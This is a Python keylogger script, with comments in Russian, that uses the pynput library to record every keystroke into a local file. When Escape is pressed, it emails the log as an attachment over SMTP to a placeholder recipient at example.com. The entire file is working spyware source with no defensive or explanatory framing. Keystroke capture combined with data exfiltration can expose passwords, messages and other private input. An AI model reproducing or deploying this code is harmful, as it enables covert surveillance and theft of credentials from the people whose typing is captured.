import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard

log_file = "keylog.txt"

# Настройки для отправки почты
smtp_server = "smtp.example.com"
smtp_port = 587
email_user = "your_email@example.com"
email_password = "your_password"
email_to = "recipient@example.com"
email_subject = "Keylogger Log File"

def send_email(file_path):
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_to
    msg['Subject'] = email_subject

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(file_path, 'rb').read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(file_path)}"')
    msg.attach(part)

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(email_user, email_password)
    server.sendmail(email_user, email_to, msg.as_string())
    server.quit()

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == key.space:
                f.write(" ")
            elif key == key.enter:
                f.write("\n")
            else:
                f.write(f" {key} ")

def on_release(key):
    if key == keyboard.Key.esc:
        send_email(log_file)
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
